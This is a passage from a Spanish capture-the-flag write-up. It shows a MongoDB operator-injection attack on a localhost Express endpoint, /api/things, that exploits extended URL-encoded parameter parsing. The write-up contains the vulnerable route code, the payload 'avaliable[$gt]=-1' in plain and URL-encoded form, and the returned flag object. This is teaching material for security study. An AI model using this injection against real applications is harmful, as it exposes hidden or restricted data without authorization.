# Flag 1

Usando el endpoint que nos provee los objetos:

```
localhost:1337/api/things
```

Nos damos cuenta de que podemos aplicar filtros sobre los atributos avaliable y título/autor. El atributo avaliable es especialmente interesante porque podría servir también para esconder objetos

Acudimos pues al código de la función:

```javascript
// Get things
router.get('/', auth, function(req, res, next) {
  var av = {$lte: 1}; var query={};
  if (req.query.avaliable && req.query.avaliable != 2) {
      av = req.query.avaliable;
  }

  if (req.query.filter) {
      query = {
          $and: [
              {
              $or: [
                  {autor: new RegExp(req.query.filter, 'i')},
                  {title: new RegExp(req.query.filter, 'i')}
              ]
              },
              {avaliable: av}
          ]
      }
  } else {
      query = {
          avaliable: av
      }
  }

  Thing.find(query, function (err, things) {
        if (err) {
            return next(err);
        } else {
            return res.json(things)
        }
  })
});
```

Donde vemos que los parámetros, especialmente el parámetro avaliable se usa directamente para la búsqueda y no quiere que sea 2, lo cual nos indica que quizás haya objetos ocultos con ese número.

Una petición promedio a este endpoint sería la siguiente:

![](evidences/ev3.png)

Para inyectar objetos javascript mediante estes parámetros es necesario que en el servidor esté activada la notación extendida para los parámetros, cosa que ocurre si lo consultamos en el código:

```javascript
app.use(bodyParser.json());
app.use(bodyParser.raw());
app.use(bodyParser.text());

app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());
```

Así pues intentaremos usar la notación extendida para insertar un objeto mediante el parámetro avaliable. La notación extendida funciona de la siguiente manera:

```
a[b]=c
# Da como resultado
{ a: { b: 'c' } }
```

La notación extendida sirve por tanto para insertar objetos complejos en parámetros codificados en la url. El payload que necesitaremos será el siguiente:

```
/api/things?filter=flag&avaliable[$gt]=-1
```

Sin embargo, si lo ejecutamos vemos que no funciona, por lo que podemos probar a codificar los caracteres especiales usando urlencode:

```
/api/things?filter=flag&avaliable%5B%24gt%5D=-1
```

![](evidences/ev4.png)

Con esto obtenemos la primera bandera

```json
  {
    "_id": "58af316286d6f448b971f9f5",
    "url": "11.jpg",
    "autor": "Flag",
    "title": "0x8433924927",
    "__v": 0,
    "avaliable": 2
  }
```
